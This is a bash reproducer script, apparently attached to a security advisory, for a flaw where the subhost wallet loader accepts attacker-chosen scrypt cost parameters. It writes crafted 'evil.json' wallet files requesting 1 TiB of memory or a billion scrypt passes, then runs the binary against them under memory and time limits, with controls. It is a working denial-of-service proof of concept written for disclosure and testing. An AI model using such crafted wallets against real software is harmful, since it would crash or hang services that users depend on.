#!/usr/bin/env bash
# Reproducer for SUBHOST-2026-002.
#
# A wallet file carries its own scrypt cost parameters. The loader only enforces
# log_n >= 14, so a wallet file can request an arbitrarily large memory or CPU
# cost. Loading the wallet then aborts or hangs the process before any
# ciphertext check runs.
#
# Usage: ./reproduce.sh [path-to-subhost-binary]
# Default binary: <repo>/target/debug/subhost

set -u

HERE=$(cd "$(dirname "$0")" && pwd)
REPO=$(cd "$HERE/../../.." && pwd)
BIN=${1:-$REPO/target/debug/subhost}
WORK=$(mktemp -d "${TMPDIR:-/tmp}/subhost-kdf-repro.XXXXXX")
PASSWORD=password123

if [ ! -x "$BIN" ]; then
    echo "error: $BIN is missing or not executable (build it with cargo build -p subhost-cli)" >&2
    exit 2
fi

mkdir -p "$WORK/memory/wallets" "$WORK/cpu/wallets" "$WORK/control/wallets"

# A wallet is 425 bytes. The ciphertext is junk; the KDF runs before the AEAD
# check, so the junk never matters.
write_wallet() {
    local path=$1 address=$2 log_n=$3 r=$4 p=$5
    local zeros48 zeros32 zeros12
    zeros48=$(printf '0,%.0s' {1..47})0
    zeros32=$(printf '0,%.0s' {1..31})0
    zeros12=$(printf '0,%.0s' {1..11})0
    cat >"$path" <<EOF
{"address": "$address", "encrypted_key": [$zeros48], "salt": [$zeros32], "nonce": [$zeros12], "version": 1, "kdf": {"log_n": $log_n, "r": $r, "p": $p}}
EOF
}

write_wallet "$WORK/memory/wallets/evil.json"  0x1111111111111111111111111111111111111111 30 8 1
write_wallet "$WORK/cpu/wallets/evil.json"     0x2222222222222222222222222222222222222222 14 1 1000000000
write_wallet "$WORK/control/wallets/evil.json" 0x3333333333333333333333333333333333333333 15 8 1

echo "binary:  $BIN"
echo "commit:  $(git -C "$REPO" rev-parse HEAD 2>/dev/null || echo unknown)"
echo "sha256:  $(sha256sum "$BIN" | cut -d' ' -f1)"
echo "workdir: $WORK"
echo

run() {
    local title=$1
    shift
    echo "=== $title ==="
    echo "\$ $*"
    set +e
    "$@" 2>&1
    local status=$?
    set -e
    echo "[exit status: $status]"
    echo
}

set -e

echo "wallet sizes:"
wc -c "$WORK/memory/wallets/evil.json" "$WORK/cpu/wallets/evil.json" "$WORK/control/wallets/evil.json"
echo

# 1 TiB of scrypt memory (128 * 2^30 * 8). The address cap keeps the abort
# reproducible on machines with overcommit enabled.
run "case 1: log_n=30, r=8, p=1 (1 TiB) with a 1 GiB address-space limit" \
    bash -c 'ulimit -v 1048576; exec "$@"' _ \
    env SUBHOST_HOME="$WORK/memory" "$BIN" wallet export \
    0x1111111111111111111111111111111111111111 --password "$PASSWORD"

# 10^9 parallel scrypt passes. scrypt allocates for the p dimension up front.
run "case 2: log_n=14, r=1, p=1000000000 (bounded by timeout 30)" \
    timeout 30 env SUBHOST_HOME="$WORK/cpu" "$BIN" wallet export \
    0x2222222222222222222222222222222222222222 --password "$PASSWORD"

# Controls: metadata read does not run the KDF, and default parameters fail
# cleanly on the same junk ciphertext.
run "control 1: wallet show reads the parameters without running the KDF" \
    env SUBHOST_HOME="$WORK/control" "$BIN" wallet show \
    0x3333333333333333333333333333333333333333

run "control 2: default parameters reject the same junk ciphertext cleanly" \
    env SUBHOST_HOME="$WORK/control" "$BIN" wallet export \
    0x3333333333333333333333333333333333333333 --password "$PASSWORD"

echo "kept for inspection: $WORK"
